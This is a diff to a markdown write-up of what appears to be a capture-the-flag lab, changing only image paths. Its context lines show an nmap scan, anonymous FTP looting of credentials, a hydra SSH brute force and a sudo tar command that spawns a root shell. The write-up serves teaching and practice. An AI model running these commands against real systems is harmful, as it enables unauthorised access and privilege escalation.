@@ -5,7 +5,7 @@
  ```bash
  nmap -vv -sC -sV -A -T4 -oN nmap_scan 10.10.255.188
  ```
-![Alt text](image.png)
+![Alt text](/images/image.png)
 
 
 ## Nmap Scan
@@ -19,12 +19,12 @@ c) port 21 FTP, and there was anonymous log in where there were 2 text files.
 
 ## FTP Recon (Port 21)
 
-![Alt text](image-1.png)
+![Alt text](/images/image-1.png)
 
 
 Checking out the files, task.txt had a username 'lin,' and the other file locks.txt had password-like texts.
 
-![Alt text](image-2.png)
+![Alt text](/images/image-2.png)
 
 SSH Brute Forcing (Port 22)
 
@@ -32,7 +32,7 @@ SSH Brute Forcing (Port 22)
 hydra -L username.txt -P locks.txt 10.10.255.188 -t4 ssh
  ```
 
-![Alt text](image-3.png)
+![Alt text](/images/image-3.png)
 
 
 SSH Brute Force
@@ -46,7 +46,7 @@ I poked around everywhere, even checked crontab, and found nothing. But checking
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  ```
 
-![Alt text](image-4.png)
+![Alt text](/images/image-4.png)
 
 
 Privilege Escalation
